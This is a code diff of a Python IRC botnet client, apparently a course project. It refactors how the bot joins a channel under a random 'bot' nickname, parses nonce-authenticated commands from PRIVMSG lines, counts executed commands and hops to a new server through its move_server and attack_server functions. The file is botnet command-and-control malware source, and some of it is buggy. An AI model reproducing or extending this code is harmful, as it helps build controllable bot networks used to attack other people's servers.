@@ -23,7 +23,7 @@ import select
 seen_nonces = list()
 
 # Count of commands seen and executed
-commands_exe = 0    #maybe change so its not global
+commands_exe = 0  
 
 # Argument Parsing
 def parse_args():
@@ -125,15 +125,14 @@ def attack_server(sock: socket, hostname: str, port: int, nickname: str, nonce: 
 def move_server(host: str, port: int, args: str):
     while(1):
         try:
-            # Change to include different channels?????? -----------------------------
             channel = "#" + args.channel
+            nickname = 'bot' + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) 
 
             #initially connect to server
             new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             new_client_socket.connect((host, port))
 
             # Sets up initial messages to send to server
-            nickname = 'bot' + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) 
             sendUser = 'USER '+ nickname +' '+ nickname +' '+ nickname +' :connect the bot!\n'
             sendNickname = "NICK "+ nickname +"\n"
             sendJoin = "JOIN "+ channel +"\n"
@@ -147,23 +146,24 @@ def move_server(host: str, port: int, args: str):
             print(text)   #print text to console
             print("connected")
 
-            # If successful connection, run the bot on the new server
-            while(1):
-                    try:
-                        client_program(args, new_client_socket, nickname)
-
-                        if text.find('PING') != -1:                          #check if 'PING' is found
-                            new_client_socket.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
-
-                    # Lost connection to server 
-                    except ConnectionError:
-                        print("lost connection.")
-
         # Failed to move to new server
         except ConnectionError:
             #print("Connection failed. Is the server dead?")
             print("Failed to connect.")
             time.sleep(5)
+
+        # If successful connection, run the bot on the new server
+        while(1):
+            try:
+                client_program(args, new_client_socket, nickname)
+
+                if text.find('PING') != -1:                          #check if 'PING' is found
+                    new_client_socket.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
+
+            # Lost connection to server 
+            except ConnectionError:
+                print("lost connection.")
+                exit(1)
 
 
 def client_program(args: str, sock: socket, bot_nickname: str):
@@ -189,25 +189,35 @@ def client_program(args: str, sock: socket, bot_nickname: str):
     
     # Check for bot join or quit
     checkJoin_Quit = data.split()
-    if(checkJoin_Quit[1] == "JOIN" or checkJoin_Quit[1] == "QUIT"):
+    #print("split DATA: ", checkJoin_Quit)
+
+    if(data.find('JOIN') != -1 or data.find('QUIT') != -1):  #checkJoin_Quit[1] == "JOIN" or checkJoin_Quit[1] == "QUIT"):
         return
 
     # parsed out command (examle: 1 497404d2 status)
-    prefix, command, messageContents = parse_message(data)
 
-    parsed_command = messageContents.pop(1)
-    trim_parsed_command = parsed_command[0:-4]
-    print(trim_parsed_command)
+    #print("THIS DATA: ", data)
 
-    cmd_data = trim_parsed_command.split()
-    print("cmd_data: ", cmd_data)
+    cmd_data = data.split()
+
+    if(data.find('PRIVMSG') != -1):
+        prefix, command, messageContents = parse_message(data)
+        parsed_command = messageContents.pop(1)
+        trim_parsed_command = parsed_command[0:-4]
+        print(trim_parsed_command)
+
+        cmd_data = trim_parsed_command.split()
+        print("cmd_data: ", cmd_data)
+
+    if(len(cmd_data) == 1 or len(cmd_data) == 0):
+        return
 
     # checks if a valid command is sent
-    if(len(cmd_data) == 1):
-        return
+
     
     global commands_exe
 
+    
     # Authenticate the command:
     if cmd_data[0] in seen_nonces:
         #ignore command
@@ -283,16 +293,16 @@ def main():
             print(text)   #print text to console
 
             print("connected")
-            while(1):
-                try:
-                    client_program(args, client_socket, nickname)
-
-                except ConnectionError:
-                    print("lost connection.")
-
         except ConnectionError:
             print("Failed to connect.")
             time.sleep(5)
+
+        while(1):
+            try:
+                client_program(args, client_socket, nickname)
+
+            except ConnectionError:
+                print("lost connection.")
 
 
 
